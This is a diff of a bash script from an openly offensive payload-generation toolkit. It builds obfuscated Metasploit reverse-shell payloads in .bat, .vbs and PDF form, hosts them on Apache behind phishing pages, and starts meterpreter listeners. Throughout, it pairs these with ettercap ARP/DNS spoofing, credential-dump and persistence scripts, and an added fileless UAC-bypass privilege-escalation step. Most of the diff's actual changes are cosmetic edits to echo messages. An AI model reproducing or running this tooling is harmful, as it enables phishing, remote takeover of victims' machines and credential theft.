 
 # build trigger.bat (x86) to call .ps1
-echo "[☠ ] Building ps1 -> trigger.bat..."
+echo "[☠] Building ps1 -> trigger.bat..."
 sleep 2
 echo ":: powershell template | Author: r00t-3xp10it" > $IPATH/output/trigger.bat
 echo ":: Matthew Graeber - DownloadString" >> $IPATH/output/trigger.bat
@@ -2165,9 +2243,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
    if [ "$serv" = "multi-handler (default)" ]; then
       # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
       zenity --title="☠ SHELLCODE GENERATOR ☠" --text "Store $N4m in apache2 webroot and\nexecute trigger.bat on target machine" --info > /dev/null 2>&1
-      echo "[☠ ] Start a multi-handler..."
-      echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-      echo "[☯ ] Please dont test samples on virus total..."
+      echo "[☠] Start a multi-handler..."
+      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+      echo "[☯] Please dont test samples on virus total..."
 xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
       sleep 2
 
@@ -2175,7 +2253,8 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
    else
 
 
-      P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" --width 350 --height 240) > /dev/null 2>&1
+      P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_multi.rc" --width 350 --height 270) > /dev/null 2>&1
+
       # edit files nedded
       cd $IPATH/templates/phishing
       cp $InJEc12 mega[bak].html
@@ -2184,7 +2263,7 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
       cd $IPATH/output
       cp $N4m.ps1 $ApAcHe/$N4m.ps1 > /dev/null 2>&1
       cp trigger.bat $ApAcHe/trigger.bat > /dev/null 2>&1
-      echo "[☠ ] loading -> Apache2Server!"
+      echo "[☠] loading -> Apache2Server!"
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
@@ -2196,9 +2275,9 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
         echo "- POST EXPLOIT : $P0"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
@@ -2207,9 +2286,9 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
         echo "- POST EXPLOIT : $P0"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
 
         fi
@@ -2218,7 +2297,7 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
 
 sleep 2
 # CLEANING EVERYTHING UP
-echo "[☠ ] Cleanning temp generated files..."
+echo "[☠] Cleanning temp generated files..."
 mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 rm $IPATH/output/chars.raw > /dev/null 2>&1
@@ -2241,7 +2320,7 @@ cd $IPATH/
 # ----------------------------------------------------
 sh_shellcode12 () {
 # get user input to build shellcode
-echo "[☠ ] Enter shellcode settings!"
+echo "[☠] Enter shellcode settings!"
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 330) > /dev/null 2>&1
 N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: shellcode" --width 300) > /dev/null 2>&1
@@ -2249,7 +2328,7 @@ N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode ou
 # input payload choise
 paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 305) > /dev/null 2>&1
 
-echo "[☠ ] Building shellcode -> psh-cmd format ..."
+echo "[☠] Building shellcode -> psh-cmd format ..."
 sleep 2
 # display final settings to user
 cat << !
@@ -2269,7 +2348,7 @@ disp=`cat $IPATH/output/chars.raw | awk {'print $12'}`
 
 # display shellcode
 echo ""
-echo "[☠ ] obfuscating -> base64 encoded!"
+echo "[☠] obfuscating -> base64 encoded!"
 sleep 2
 echo $disp
 echo ""
@@ -2277,25 +2356,25 @@ sleep 2
 
 # EDITING/BACKUP FILES NEEDED
 echo ""
-echo "[☠ ] editing/backup files..."
+echo "[☠] editing/backup files..."
 cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
 sleep 2
 
    # check if chars.raw as generated
    if [ -e $Ch4Rs ]; then
-      echo "[☠ ] chars.raw -> found!"
+      echo "[☠] chars.raw -> found!"
       sleep 2
  
    else
 
-      echo "[☠ ] chars.raw -> not found!"
+      echo "[☠] chars.raw -> not found!"
       exit
       fi
 
 
 # injecting shellcode into name
 cd $IPATH/output/
-echo "[☠ ] Injecting shellcode -> $N4m.bat!"
+echo "[☠] Injecting shellcode -> $N4m.bat!"
 sleep 2
 echo ":: powershell bat template | Author: r00t-3xp10it" > $N4m.bat
 echo ":: unicorn - reproduction (base64 encoded)" >> $N4m.bat
@@ -2310,9 +2389,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
 
    if [ "$serv" = "multi-handler (default)" ]; then
       # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-      echo "[☠ ] Start a multi-handler..."
-      echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-      echo "[☯ ] Please dont test samples on virus total..."
+      echo "[☠] Start a multi-handler..."
+      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+      echo "[☯] Please dont test samples on virus total..."
 xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
       sleep 2
 
@@ -2320,7 +2399,7 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
    else
 
 
-P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" --width 350 --height 260) > /dev/null 2>&1
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" --width 350 --height 300) > /dev/null 2>&1
 
   if [ "$P0" = "persistence.rc" ]; then
   M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.bat on target every 23 hours" --width 300) > /dev/null 2>&1
@@ -2341,6 +2420,22 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
     mv $lhost.rc $IPATH/output/$lhost.rc
     cd $IPATH
 
+    elif [ "$P0" = "privilege_escalation.rc" ]; then
+      cd $IPATH/aux
+      # backup files needed
+      cp privilege_escalation.rc privilege_escalation[bak].rc
+      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb
+      # Build resource files needed
+      sed -i "s|N4m|$N4m.bat|g" privilege_escalation.rc
+      sed -i "s|IPATH|$IPATH|g" privilege_escalation.rc
+      sed -i "s|N4m|$N4m.bat|g" enigma_fileless_uac_bypass.rb
+      # reload metasploit database
+      echo "[☠] copy post-module to msf db!"
+      cp enigma_fileless_uac_bypass.rb $mSf/enigma_fileless_uac_bypass.rb
+      echo "[☠] reloading -> Metasploit database!"
+      xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
+      cd $IPATH
+
   else
 
     echo "do nothing" > /dev/null 2>&1
@@ -2354,7 +2449,7 @@ fi
       cp copy.html $ApAcHe/index.html > /dev/null 2>&1
       cd $IPATH/output
       cp $N4m.bat $ApAcHe/$N4m.bat > /dev/null 2>&1
-      echo "[☠ ] loading -> Apache2Server!"
+      echo "[☠] loading -> Apache2Server!"
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
@@ -2366,9 +2461,9 @@ fi
         echo "- POST EXPLOIT : $P0"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
@@ -2377,9 +2472,9 @@ fi
         echo "- POST EXPLOIT : $P0"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
 
         fi
@@ -2388,8 +2483,10 @@ fi
 
 sleep 2
 # CLEANING EVERYTHING UP
-echo "[☠ ] Cleanning temp generated files..."
+echo "[☠] Cleanning temp generated files..."
 mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
+mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
+mv $IPATH/aux/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
 mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 rm $IPATH/output/chars.raw > /dev/null 2>&1
@@ -2412,7 +2509,7 @@ cd $IPATH/
 # --------------------------------------------------------
 sh_shellcode13 () {
 # get user input to build shellcode
-echo "[☠ ] Enter shellcode settings!"
+echo "[☠] Enter shellcode settings!"
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 330) > /dev/null 2>&1
 N4m=$(zenity --title="☠ VBS NAME ☠" --text "example: shellcode" --entry --width 330) > /dev/null 2>&1
@@ -2420,7 +2517,7 @@ N4m=$(zenity --title="☠ VBS NAME ☠" --text "example: shellcode" --entry --wi
 # input payload choise
 paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 305) > /dev/null 2>&1
 
-echo "[☠ ] Building shellcode -> vbs format ..."
+echo "[☠] Building shellcode -> vbs format ..."
 # display final settings to user
 cat << !
 
@@ -2435,17 +2532,17 @@ cat << !
 
 # use metasploit to build shellcode
 xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -e x86/shikata_ga_nai -i 9 -f vbs > $IPATH/obfuscate/$N4m.vbs" > /dev/null 2>&1
-echo "[☠ ] encoded -> shikata_ga_nai"
+echo "[☠] encoded -> shikata_ga_nai"
 sleep 2
 cat $IPATH/obfuscate/$N4m.vbs | grep '"' | awk {'print $3'} | cut -d '=' -f2
 # obfuscating payload.vbs
-echo "[☠ ] Obfuscating sourcecode..."
+echo "[☠] Obfuscating sourcecode..."
 sleep 2
 cd $IPATH/obfuscate/
 xterm -T "☠ VBS-OBFUSCATOR.PY ☠" -geometry 110x23 -e "python vbs-obfuscator.py $N4m.vbs final.vbs"
 cp final.vbs $IPATH/output/$N4m.vbs > /dev/null 2>&1
 rm $N4m.vbs > /dev/null 2>&1
-echo "[☠ ] Injecting shellcode -> $N4m.vbs!"
+echo "[☠] Injecting shellcode -> $N4m.vbs!"
 sleep 2
 cd $IPATH/
 
@@ -2455,9 +2552,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "PAYLOAD STORE
 
    if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-     echo "[☠ ] Start a multi-handler..."
-     echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-     echo "[☯ ] Please dont test samples on virus total..."
+     echo "[☠] Start a multi-handler..."
+     echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+     echo "[☯] Please dont test samples on virus total..."
      xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
 
    else
@@ -2470,7 +2567,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "PAYLOAD STORE
       # copy from output
       cd $IPATH/output
       cp $N4m.vbs $ApAcHe/$N4m.vbs > /dev/null 2>&1
-      echo "[☠ ] loading -> Apache2Server!"
+      echo "[☠] loading -> Apache2Server!"
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
@@ -2481,9 +2578,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "PAYLOAD STORE
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
@@ -2491,9 +2588,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "PAYLOAD STORE
         echo "- ATTACK VECTOR: http://$lhost"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
 
         fi
@@ -2501,7 +2598,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "PAYLOAD STORE
 
 
 # CLEANING EVERYTHING UP
-echo "[☠ ] Cleanning temp generated files..."
+echo "[☠] Cleanning temp generated files..."
 sleep 2
 mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
 rm $IPATH/obfuscate/final.vbs > /dev/null 2>&1
@@ -2522,7 +2619,7 @@ cd $IPATH/
 # ----------------------------------------------------
 sh_shellcode14 () {
 # get user input to build shellcode
-echo "[☠ ] Enter shellcode settings!"
+echo "[☠] Enter shellcode settings!"
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 330) > /dev/null 2>&1
 N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: shellcode" --width 300) > /dev/null 2>&1
@@ -2530,7 +2627,7 @@ N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode ou
 # input payload choise
 paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 305) > /dev/null 2>&1
 
-echo "[☠ ] Building shellcode -> psh-cmd format ..."
+echo "[☠] Building shellcode -> psh-cmd format ..."
 sleep 2
 # display final settings to user
 cat << !
@@ -2550,7 +2647,7 @@ disp=`cat $IPATH/output/chars.raw | awk {'print $12'}`
 
 # display shellcode
 echo ""
-echo "[☠ ] obfuscating -> base64 encoded!"
+echo "[☠] obfuscating -> base64 encoded!"
 sleep 2
 echo $disp
 echo ""
@@ -2558,36 +2655,36 @@ sleep 2
 
 # EDITING/BACKUP FILES NEEDED
 echo ""
-echo "[☠ ] editing/backup files..."
+echo "[☠] editing/backup files..."
 sleep 2
 
    # check if chars.raw as generated
    if [ -e $Ch4Rs ]; then
-      echo "[☠ ] chars.raw -> found!"
+      echo "[☠] chars.raw -> found!"
       sleep 2
  
    else
 
-      echo "[☠ ] chars.raw -> not found!"
+      echo "[☠] chars.raw -> not found!"
       exit
       fi
 
 
    # check if exec.vbs as generated
    if [ -e $IPATH/templates/exec.vbs ]; then
-      echo "[☠ ] exec.vbs  -> found!"
+      echo "[☠] exec.vbs  -> found!"
       sleep 2
  
    else
 
-      echo "[☠ ] exec.vbs  -> not found!"
+      echo "[☠] exec.vbs  -> not found!"
       exit
       fi
 
 
 # injecting shellcode into name
 cd $IPATH/templates/
-echo "[☠ ] Injecting shellcode -> $N4m.vbs!"
+echo "[☠] Injecting shellcode -> $N4m.vbs!"
 sleep 2
 sed "s|InJ3C|$disp|" exec.vbs > $N4m.vbs
 mv $N4m.vbs $IPATH/output/$N4m.vbs
@@ -2600,9 +2697,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
 
    if [ "$serv" = "multi-handler (default)" ]; then
       # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-      echo "[☠ ] Start a multi-handler..."
-      echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-      echo "[☯ ] Please dont test samples on virus total..."
+      echo "[☠] Start a multi-handler..."
+      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+      echo "[☯] Please dont test samples on virus total..."
 xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
       sleep 2
 
@@ -2610,7 +2707,7 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
    else
 
 
-P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" --width 350 --height 260) > /dev/null 2>&1
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" --width 350 --height 300) > /dev/null 2>&1
 
   if [ "$P0" = "persistence.rc" ]; then
   M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.vbs on target every 23 hours" --width 300) > /dev/null 2>&1
@@ -2631,6 +2728,22 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
     mv $lhost.rc $IPATH/output/$lhost.rc
     cd $IPATH
 
+    elif [ "$P0" = "privilege_escalation.rc" ]; then
+      cd $IPATH/aux
+      # backup files needed
+      cp privilege_escalation.rc privilege_escalation[bak].rc
+      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb
+      # Build resource files needed
+      sed -i "s|N4m|$N4m.vbs|g" privilege_escalation.rc
+      sed -i "s|IPATH|$IPATH|g" privilege_escalation.rc
+      sed -i "s|N4m|$N4m.vbs|g" enigma_fileless_uac_bypass.rb
+      # reload metasploit database
+      echo "[☠] copy post-module to msf db!"
+      cp enigma_fileless_uac_bypass.rb $mSf/enigma_fileless_uac_bypass.rb
+      echo "[☠] reloading -> Metasploit database!"
+      xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
+      cd $IPATH
+
   else
 
     echo "do nothing" > /dev/null 2>&1
@@ -2645,7 +2758,7 @@ fi
       cp copy.html $ApAcHe/index.html > /dev/null 2>&1
       cd $IPATH/output
       cp $N4m.vbs $ApAcHe/$N4m.vbs > /dev/null 2>&1
-      echo "[☠ ] loading -> Apache2Server!"
+      echo "[☠] loading -> Apache2Server!"
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
@@ -2657,9 +2770,9 @@ fi
         echo "- POST EXPLOIT : $P0"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
@@ -2668,9 +2781,9 @@ fi
         echo "- POST EXPLOIT : $P0"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
 
         fi
@@ -2679,8 +2792,10 @@ fi
 
 sleep 2
 # CLEANING EVERYTHING UP
-echo "[☠ ] Cleanning temp generated files..."
+echo "[☠] Cleanning temp generated files..."
 mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
+mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
+mv $IPATH/aux/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
 mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 rm $IPATH/output/chars.raw > /dev/null 2>&1
@@ -2701,8 +2816,8 @@ cd $IPATH/
 # ----------------------------------------------------
 sh_shellcode15 () {
 
-echo "[☠ ] EVIL PDF BUILDER -> running..."
-echo "[☠ ] targets: windows xp/vista/7!"
+echo "[☠] EVIL PDF BUILDER -> running..."
+echo "[☠] targets: windows xp/vista/7!"
 sleep 1
 # input PDF output format
 oUt=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nevil PDF builder\ncrypting mechanisms available:" --radiolist --column "Pick" --column "Option" TRUE "base64" FALSE "random xor key" --width 300 --height 200) > /dev/null 2>&1
@@ -2710,7 +2825,7 @@ oUt=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nevil PDF bui
 
 if [ "$oUt" = "base64" ]; then
 # get user input to build shellcode
-echo "[☠ ] Enter shellcode settings!"
+echo "[☠] Enter shellcode settings!"
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 330) > /dev/null 2>&1
 N4m=$(zenity --entry --title "☠ ENTER PDF NAME ☠" --text "Enter pdf output name\nexample: shellcode" --width 300) > /dev/null 2>&1
@@ -2720,7 +2835,7 @@ Myd0=$(zenity --title "☠ SELECT PDF FILE TO BE EMBEDDED ☠" --filename=$IPATH
 # input payload choise
 paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 305) > /dev/null 2>&1
 
-echo "[☠ ] Building shellcode -> psh-cmd format ..."
+echo "[☠] Building shellcode -> psh-cmd format ..."
 sleep 2
 # display final settings to user
 cat << !
@@ -2741,7 +2856,7 @@ str0=`cat $IPATH/output/chars.raw | awk {'print $12'}`
 
 # display shellcode
 echo ""
-echo "[☠ ] obfuscating -> base64 encoded!"
+echo "[☠] obfuscating -> base64 encoded!"
 sleep 2
 echo $str0
 echo ""
